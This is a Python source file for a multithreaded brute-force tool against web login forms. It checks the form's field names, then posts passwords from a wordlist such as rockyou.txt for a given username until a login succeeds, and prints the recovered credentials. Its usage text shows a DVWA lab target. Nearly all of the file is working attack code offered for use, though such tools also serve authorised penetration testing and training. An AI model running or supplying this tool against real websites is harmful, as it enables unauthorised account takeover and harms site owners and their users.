import optparse
from tabulate import tabulate
from ..Automated.important_static_functions import *
import time
import threading


class BruteForceManual:
    threads = []
    username_field = ''
    password_field = ''
    submit_field = ''

    def __init__(self):
        parser = optparse.OptionParser()
        parser.add_option('-u', '--url', dest='url')
        parser.add_option('-l', '--login_name', dest='username')
        parser.add_option('-p', '--passwords', dest='passwords')
        parser.add_option('-f', '--fields', dest='import_fields')
        parser.add_option('-y', '--verification', dest='verification')
        parser.add_option('-v', '--verbose', dest='verbose', action='store_true')
        parser.add_option('-t', '--threads', dest='threads')
        options, arguments = parser.parse_args()
        self.url = options.url
        self.username = options.username
        self.passwords = options.passwords
        self.fields = options.import_fields
        self.verification = options.verification
        self.threads_num = options.threads
        self.verbose = options.verbose
        if self.threads_num is None:
            self.threads_num = 10
        self.start = time.time()
        self.creds_found = False
        self.end = time.time()
        self.stop_event = threading.Event()
        if self.url is None or self.passwords is None or self.username is None or self.verification is None:
            print(error('Proper Arguments Not Given:'))
            self.script_usage()
            sys.exit(0)

    @staticmethod
    def script_usage():
        """
        Colored Table That Show a small simple Guide for using this program.
        """
        my_data = [
            [colored("Username", 'yellow'), colored("-l", 'green'), colored("A valid Username Not Given.", 'red')],
            [colored("Passwords", 'yellow'), colored("-p", 'green'), colored("List Of Possible Passwords.", 'red')],
            [colored("URL", 'yellow'), colored("-u", 'green'), colored("Website Want to Attack.", 'red')],
            [colored("Threads", 'yellow'), colored("-t", 'green'), colored("No of Threads To Use", 'red')],
            [colored("fields", 'yellow'), colored("-f", 'green'), colored("Important Fields, username:password:login"
                                                                          "", 'red')],
            [colored("Verification", 'yellow'), colored("-v", 'green'), colored("To Verify if login is made", 'red')]]
        head = [colored("Name", 'blue'), colored("Arguments", 'blue'), colored("Help", 'blue')]
        print(tabulate(my_data, headers=head) + "\n")
        cprint('[!] Proper Usage: ', color='cyan', attrs=['bold'])
        print(colored('''\t./bruteforce -l admin -p "/usr/share/wordlists/rockyou.txt" \
-u "http://192.168.56.101/dvwa/login.php" -t 15 -y "Login failed" -f username:password:Login''', 'cyan'))
        cprint('[!] Note: ', color='cyan', attrs=['bold'])
        print(colored("\tFormat of important fields is always, username_field:password_field:submit_button", 'cyan'))

    def getting_fields_from_commandline_input(self):
        input_fields = self.fields.split(':')
        self.username_field = input_fields[0]
        self.password_field = input_fields[1]
        self.submit_field = input_fields[2]

    def checking_fields(self, forms):
        """Extracting forms fro the give HTML data."""
        for form in forms:
            """Iterating Over each form."""
            inputs_field = getting_specify_tags(form, 'input')
            """Finding inputs filed from each form."""
            tag_types, tag_names, submit = extracting_tags_attributes(inputs_field, 'type', 'name')
            if len(tag_types) < 3 and len(tag_names) < 3:
                self.getting_fields_from_commandline_input()
                for types, names in zip(tag_types, tag_names):
                    if types == 'password':
                        if names == self.password_field:
                            print(colored(f"[+] Password Field Matches\nScraped: {names}, User Input: "
                                          f"{self.password_field}", 'green'))
                        else:
                            print(colored(f'[-] Cannot Find the give field in the form, {self.password_field}', 'red'))
                            sys.exit(0)
                    else:
                        if names == self.username_field:
                            print(colored(f"[+] Password Field Matches\nScraped: {names}, User Input: "
                                          f"{self.username_field}", 'green'))
                        else:
                            print(colored(f'[-] Cannot Find the give field in the form, {self.username_field}', 'red'))
                            sys.exit(0)
                if submit[0][1] == self.submit_field:
                    print(colored(f"[+] Submit Field Matches\nScraped: {submit[0][1]}, User Input: "
                                  f"{self.submit_field}", 'green'))
                else:
                    print(colored(f'[-] Cannot Find the give field in the form, {self.submit_field}', 'red'))
                    sys.exit(0)

    def fields_verification(self):
        """
        This method is use to verify, if the give username, password, submit, are present in html data.
        """
        bs4_parsed_data = request(self.url)
        """Parsing HTML code for bs4."""
        forms = getting_forms(bs4_parsed_data, 'form')
        if len(forms) == 1:
            self.checking_fields(forms)
        else:
            """
            If the length is greater than 1. Then option of using which form to use. 
            """
            form_index = 0
            print(colored(f'[!] More Than One Form Found, Total Forms: {len(forms)}', 'red'))
            for form in forms:
                main_line_of_forms = str(form).split('>')[0]
                print(colored(f"[+] Form Index: [{form_index}]\n\tForm Data:", 'green') +
                      colored(f"\n\t{main_line_of_forms}", 'yellow'))
                form_index += 1
            print((colored('[+] Index Of Form To Search: ', 'blue')))
            form_to_search = input('')
            try:
                form = forms[int(form_to_search)]
                self.checking_fields(form)
            except IndexError:
                print(colored(f'[-] Form With Index {form_to_search} Not Found.', 'red'))
                sys.exit(0)
            except ValueError:
                print(colored('[-] Integer Required.', 'red'))
                sys.exit(0)

    def proper_response(self, data, word, number):
        if self.creds_found:
            return
        response = brute_force_request(self.url, data=data, timeout=5)
        if self.verification in response.content.decode('utf-8'):
            if self.verbose is not None:
                print(f'\rWorking On {number}\t\tPassword Invalid "{word}"\n', end='')
            else:
                pass
        else:
            self.end = time.time()
            print(f'\rWorking On {number}\t\tPassword Found "{word}"\n', end='')
            self.creds_found = True
            time.sleep(3)
            print("\n\n")
            print(colored(f"[*] Total time - {self.end - self.start} seconds.\n", 'yellow'))
            print(colored(f"Credentials for ", 'blue') + colored(f"{self.url}\n", 'green') +
                  colored(f"Username: ", 'blue') + colored(f"{self.username}\n", 'green') +
                  colored("Password: ", 'blue') + colored(f"{word}", 'green'))

    def brute_force(self):
        connection_check(self.url)
        self.fields_verification()
        self.getting_fields_from_commandline_input()
        print(self.username_field, self.password_field, self.submit_field)
        number = 1
        words = read(self.passwords)
        for word in words:
            if self.creds_found:
                self.exit()
            word = clean_word(word)
            data = {
                self.username_field: self.username,
                self.password_field: word,
                self.submit_field: 'submit'
            }
            thread = threading.Thread(target=self.proper_response, args=(data, word, number))
            self.threads.append(thread)
            try:
                while threading.activeCount() > int(self.threads_num) + 1:
                    continue
            except KeyboardInterrupt:
                sys.exit(0)
            thread.start()
            number += 1
        self.exit()

    def collection_of_threads(self):
        for thread in self.threads:
            try:
                thread.join()
            except RuntimeError:
                pass

    def exit(self):
        if not self.creds_found:
            print("\n[*] - Approaching final keyspace...")
        self.collection_of_threads()

        if not self.creds_found:
            print(f"[-] - Failed to find valid credentials for {self.url}")
            self.end = time.time()
            print(f"[*] Total time - {self.end - self.start} seconds.")
        sys.exit()
